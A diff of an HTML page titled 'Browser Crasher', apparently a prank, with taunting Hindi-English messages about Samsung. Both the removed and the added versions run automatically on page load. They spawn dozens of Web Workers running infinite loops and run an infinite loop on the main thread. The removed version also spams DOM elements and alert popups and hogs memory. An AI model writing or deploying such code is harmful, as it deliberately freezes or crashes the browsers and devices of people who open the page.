@@ -1,53 +1,38 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>ULTIMATE Browser Crasher</title>
+    <title>Powerful Browser Crasher</title>
     <script>
-      // Worker creator
-      function createCrasherWorker() {
+      // Function to create Web Worker that runs infinite loop
+      function createCrasher() {
         const blob = new Blob([
           `onmessage = function() {
-            while (true) {
-              let arr = new Array(1000000).fill(Math.random());
-            }
+              while (true) {
+                let x = Math.random() * Math.random();
+              }
           }`
         ], { type: 'application/javascript' });
 
         const worker = new Worker(URL.createObjectURL(blob));
-        worker.postMessage('go');
+        worker.postMessage('start');
       }
 
-      function startDoom() {
-        // DOM Bombing
-        setInterval(() => {
-          const el = document.createElement('div');
-          el.innerText = "Samsung worst company ever!";
-          el.style.fontSize = '50px';
-          document.body.appendChild(el);
-        }, 10);
-
-        // Alert Spam
-        setInterval(() => {
-          alert("Samsung lagged again!");
-        }, 200);
-
-        // Spawn Web Workers
-        for (let i = 0; i < 100; i++) {
-          createCrasherWorker();
+      window.onload = function () {
+        // Run multiple web workers to fully fry browser
+        for (let i = 0; i < 50; i++) {
+          createCrasher();
         }
 
-        // Main Thread infinite memory hog
+        // Also run infinite loop on main thread
         while (true) {
-          let arr = new Array(1000000).fill("Samsung is the worst");
-          console.log("Crashing...");
+          let x = Math.random() * Math.random();
+          console.log("Samsung bekaar company hai!");
         }
-      }
-
-      window.onload = startDoom;
+      };
     </script>
   </head>
   <body>
-    <h1>Bro... tumne khud ke browser ko MAR diya!</h1>
-    <p>Samsung ka naam sunte hi crash ho gaya kya?</p>
+    <h1>Browser Doom Activated!</h1>
+    <p>Samsung = Crash + Lag + Heat = Disaster!</p>
   </body>
 </html>
